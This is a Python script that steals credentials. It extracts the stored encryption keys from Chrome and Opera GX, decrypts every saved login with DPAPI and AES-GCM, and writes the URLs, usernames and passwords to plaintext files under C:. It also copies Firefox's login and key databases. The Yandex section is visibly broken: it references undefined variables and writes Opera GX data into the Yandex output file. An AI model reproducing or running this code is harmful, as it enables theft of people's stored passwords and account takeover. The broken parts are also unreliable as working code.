
import os
import base64
from Crypto.Cipher import AES
import sqlite3
import win32crypt
import shutil
import zipfile
import json
import requests
import sys


def get_master_key_operaGX():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def get_master_key():
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        return e

def Chrome(): 
    text = ""
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "LoginvaultChrome.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("LoginvaultChrome.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            text += "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n"
        return text
    except Exception as e:
        print(e)

    cursor.close()
    conn.close()

    try:
        os.remove("LoginvaultChrome.db")
    except Exception as e:
        pass


file = open('C:' + '\\google_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
file.write(str(Chrome()) + '\n')
file.close()


def Firefox():
   master_key = get_master_key()
   textf = ''
   for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
       for name in dirs:
            try:
                shutil.copy2(os.path.join(root, name)+'\\logins.json', "logins.json")
                shutil.copy2(os.path.join(root, name)+'\\key4.db', "key4.db")
            except Exception as e:
                print(e)
       break
   return textf
print(os.getenv("APPDATA") )

def OperaGX():
    texto = ""
    master_key = get_master_key_operaGX()
    login_data = os.environ['USERPROFILE'] + os.sep + r'AppData\Roaming\Opera Software\Opera GX Stable\Login Data'
    shutil.copy2(login_data, "LoginvaultOperaGX.db") 
    conn = sqlite3.connect("LoginvaultOperaGX.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print(str(encrypted_password))
            texto += "URL: " + str(url) + "\nUser Name: " + str(username) + "\nPassword: " + str(decrypted_password) + "\n"
        return texto
    except Exception as e:
        print(e)

    cursor.close()
    conn.close()

    try:
        os.remove("LoginvaultOperaGX.db")
    except Exception as e:
        pass      

file = open('C:' + '\\operaGX_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
file.write(str(OperaGX()) + '\n')
file.close()

def master_key_yandex():
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data'
    shutil.copy2(login_data, "KeyYandex.db") 
    conn = sqlite3.connect("KeyYandex.db")
    cursor = conn.cursor()
    try:
        master_key = base64.b64decode(cursor.execute("SELECT local_encryptor_data FROM meta"))
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        print(e)
        return None

def yandex():
    textY = ""
    mster_key = master_key_yandex()
    login_data = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Yandex\YandexBrowser\User Data\Default\Ya Passman Data'
    shutil.copy2(login_data, "LoginvaultYandex.db") 
    conn = sqlite3.connect("LoginvaultYandex.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            print(str(encrypted_password))
            texto += "URL: " + str(url) + "\nUser Name: " + str(username) + "\nPassword: " + str(decrypted_password) + "\n"
        return texto
    except Exception as e:
        print(e)

    cursor.close()
    conn.close()

    try:
        os.remove("LoginvaultYandex.db")
    except Exception as e:
        pass      

file = open('C:' + '\\Yandex_pass.txt', "w+") #Сохраняем данныем в txt файл google_pass
file.write(str(OperaGX()) + '\n')
file.close()